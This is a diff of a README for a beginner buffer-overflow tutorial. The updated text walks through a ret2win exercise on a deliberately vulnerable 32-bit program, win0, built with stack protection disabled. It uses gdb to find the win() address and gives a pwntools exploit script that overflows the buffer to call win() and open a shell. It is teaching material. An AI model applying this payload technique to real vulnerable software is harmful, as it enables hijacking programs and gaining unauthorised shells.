@@ -1,5 +1,7 @@
 # Buffer Overflow
 
+![image](https://user-images.githubusercontent.com/91763346/196064685-1dead369-bc6c-4d61-ad09-37deb9e9f0e3.png)
+
 Hello everyone! This Buffer Overflow documentation provides the complete demonstration, understanding and the scripts necessary for buffer overflow exploitation.
 
 ## Introduction
@@ -18,6 +20,8 @@ A **buffer overflow** occurs when **more data is put into a fixed-length buffer*
 1. GCC Debugger
 2. Kali Linux or any other Linux Distro.
 3. Git
+4. python3
+5. pwntools
 
 ## Memory Stack
 
@@ -72,85 +76,144 @@ Now, the A’s have completely escaped the buffer space and have actually reache
 
 ## Example 1
 
-Basic demonstration of a stack buffer overflow. This example is compiled to a 32-bit program, and has stack protection disabled.
+Basic demonstration of a stack buffer overflow. This example is compiled to a **32-bit** program, and has stack protection disabled.
 
 ```
-gcc -o stack stack.c -m32 -fno-stack-protector
+gcc -o win0 win0.c -m32 -fno-stack-protector
 ```
 Let's import the git repo using the command **git clone** :
 
 ```
 git clone https://github.com/videxrealone/Buffer-Overflow/
 ```
+
+Let's install python3 along with pwntools :
+
+```
+$ apt-get update
+$ apt-get install python3 python3-pip python3-dev git libssl-dev libffi-dev build-essential
+$ python3 -m pip install --upgrade pip
+$ python3 -m pip install --upgrade pwntools
+```
 ## Goal
 
-Using the file **stack**, you need to get through the condition **exploit == 0x9876** and have the message "**It worked!**" printed. No file modification is allowed.
+Using the program **win0**, you need to call the function **win()** and pop a **shell**. No file modification is allowed.
 
 ## Solution
 
-This exploit is about the function fgets. Our array is 10 bytes long and the function fgets is looking for up to 13 bytes. Thus, by giving more than 10 bytes to the standard input, we are going to overrun the buffer's boundary and overwrite an adjacent memory location. 
-Let me guide you through a simple solution in which we'll be using python alongside **gdb**
+This exploit is about the function **puts()**, **win()**, **gets()** and to display how dangerous a buffer overflow attack can be. 
+Let me guide you through a simple solution in which we'll be using python3 alongside **gdb**
 
-Let's start by inspecting the source file **stack.c** :
+Let's start by inspecting the source file **win0.c** :
 ```
-cat stack.c
+cat win0.c
 ```
-How to trigger the "***It worked!***" output ?
+We can cleary see that the **Win()** functions calls a **/bin/sh** and that gives us access to a shell that we can use to execute commands.
+How to trigger the "**win()**" ?
 
 Let's debug the file using GCC :
 ```
-gdb stack
+gdb win0
 ```
 Let's try running the program using the command run :
 
 ```
 run
 ```
-Now lets use a simple input that DOES NOT exceed 13 bytes :
+Now lets use a simple input that DOES NOT exceed 80 bytes :
 
 ```
 AAAAAAAAAA
 ```
-We can see that the program worked just fine, let's try re-running it while using an out of bound input. (any input that exceeds 13 bytes) :
+We can see that the program worked just fine, let's try re-running it while using an out of bound input. (any input that exceeds 80 bytes) :
 
 ```
-run
+gdb> run
 
 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 ```
-We can see that we got a segmentation fault and that the program crashed, thats because we have overflooded the stack and corrupted the return addresses and return addresses :
+We can see that we got a segmentation fault and that the program crashed, thats because we have overflooded the stack and corrupted the return addresses :
+
+Let's try to locate the address of the **win()** function :
+
+We can use **info functions** to display all functions that are using in the ELF (Executable Linkable File).
+
+```
+gdb> info functions
+```
+or we can use a much simpler method to give us directly the address of the win().
+```
+gdb> x win
+```
+Let's save that address for now.
 
 Let's quit gdb using **quit** :
 
 ```
-quit
+gdb> quit
 ```
-In linux we can execute simple python commands directly in the terminal using **-c**, can you run a simple **"print 'Hello world!' "** ?
+
+In linux we can execute simple python commands directly in the terminal using **-c**, can you run a simple **"print ('Hello world!') "** ?
 
 ```
 python -c "------------"
 ```
 Now that we know how to execute commands in python, I should tell you about a facinating secret in linux, you can actually run more than one command in a terminal! 
 let's try it!
-Let's run a simple echo with two different messages using the **" | "** (ALT GR + 6)  . 
+Let's run 2 python programs with the **" && "** (logical AND). 
+
 ```
-echo I'm a message | echo I'm another message
+python -c "print('Hello')" && python -c "print('World')"
 ```
-Did you spot something unusual?
-It's the execution order of the commands.
+We can also do it with **" ; "** (The semicolomn method is helpful when writing **BASH** scripts).
+
+```
+python -c "print('Hello')" ; python -c "print('World')"
+```
+
 
 Let's go back to our program.
-Let's try to force the condition **"exploit == 0x9876"**, what we're going to do is to simply concatinate the address with random letters.
+Let's try to force-call the **"win()"** address, what we're going to do is to simply concatinate the address with a small playload of letters.
+
 There's something else you should know, **STACK WORKS IN REVERSE!** (you can google Little Endian & Big Endian)
 
 ![image](https://user-images.githubusercontent.com/91763346/194781982-6f6d27e8-62d9-462e-843c-0e2266ace887.png)
 
-So now, knowing that it works as a little endian, we can easily inject it, to force the **"exploit == 0x9876"** but before that we got to run the executable using **./stack**
+So now, knowing that it works as a little endian, we can easily inject it, to force the **"win()"** callout.
+Let's go ahead and write a script.
 
-Using python :
+Let's create a python program.
 
 ```
-python -c "print 'A'*10+'\x76\x98'" | ./stack
+$ touch exploit.py
+$ nano exploit.py  // you can also use : vim exploit.py
 ```
 
-Remember that stack works in reverse! & that python is a very powerful tool that we need to learn.
+Using any text editor of your choice, **copy** this text inside the file using **CTRL + SHIFT + C** and **paste it** using **CTRL + SHIFT + V**  :
+
+```
+from pwn import *
+
+p=process("./win0") #the 
+
+win = 0x08049186 #win address. 
+
+payload = b""
+payload += b"A" * 88   #Segmentation offset
+payload += p32(0x0)    #This is a padding, used to create some space to get the right offset
+payload += p32(win)
+
+#final payload would look something like this: payload=" 'A'*88"+'\x00'+'\x86\x91\x04\x08' "
+
+p.sendline(payload)   #used to send the payload once the process executes.
+p.interactive()     #made to make link the payload and the process.
+
+```
+And now let's run the python script and become hackers 🕶️. 
+
+Remember that stack works in reverse! & that python is a very powerful tool that you need to learn if you're willing to get deeper into CyberSec.
+
+## Resources
+
+https://ctf101.org/binary-exploitation/overview/
+https://ir0nstone.gitbook.io/notes/types/stack/introduction
